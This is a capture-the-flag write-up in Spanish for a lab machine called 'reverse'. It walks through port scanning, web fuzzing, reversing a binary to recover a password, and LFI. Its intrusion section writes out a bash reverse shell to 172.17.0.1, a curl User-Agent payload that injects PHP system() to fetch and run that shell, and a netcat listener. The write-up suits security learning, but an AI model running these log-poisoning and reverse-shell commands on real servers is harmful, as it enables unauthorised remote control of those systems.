# Maquina reverse

### Puertos abiertos

sudo nmap -sS --min-rate 6000 -p- --open -vvv -Pn 172.17.0.2

![alt text](image.png)

### Servicios y versiones

sudo nmap -sVC --min-rate 6000 -p80 vvv -Pn 172.17.0.2

![alt text](image-1.png)

### Fuzzing Web

gobuster dir -t 200 -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak,sh,py,js,html -r -b 403,404 2>/dev/null

no se encontró nada

Entrando en la web:

![alt text](image-3.png)

y al hacer multiples veces clic

![alt text](image-4.png)

accedí a /scret_dir y lo descargué con wget

![alt text](image-2.png)

lo ejecuté:

![alt text](image-6.png)

lo analicé con ghidra

![alt text](image-5.png)

aquí vi la contraseña:
@MiS3cRetd00m

lo volví a ejecutar

![alt text](image-7.png)

lo desencripté con base64:

![alt text](image-8.png)

como se trata de un subdominio lo agrego al /etc/hosts

accedemos a http://g00dj0b.reverse.dl/

![alt text](image-9.png)

![alt text](image-10.png)

la url pinta como LFI:

entonces buscamos el /etc/passwd

![alt text](image-11.png)

accedí a access.log:

![alt text](image-12.png)


### Intrusión

Con la técnica de Log Poisoning

a.- Creamos un archivo shell con el siguiente contenido:

bash -i >& /dev/tcp/172.17.0.1/443 0>&1

b.- Levantamos un servidor con python

python3 -m http.server 80

c.- Enviamos la shell por curl.

curl -i 172.17.0.2 -A "<?php system('curl 172.17.0.1:80/shell | bash'); ?>"

d.- Recargamos la web con la url que tiene el /var/log/apache2/access.log

e.- Ponemos en escucha con netcat

sudo nc -nlvp 443

### Escalar privilegios

![alt text](image-13.png)

transferí el rockyou con wget

![alt text](image-14.png)

contenido del archivo:

![alt text](image-15.png)

![alt text](image-17.png)

![alt text](image-16.png)

siendo nova hice sudo -l

![alt text](image-18.png)

creo un codigo.c

![alt text](image-19.png)

lo compilo y ejecuto:

![alt text](image-20.png)

siendo maci:

![alt text](image-21.png)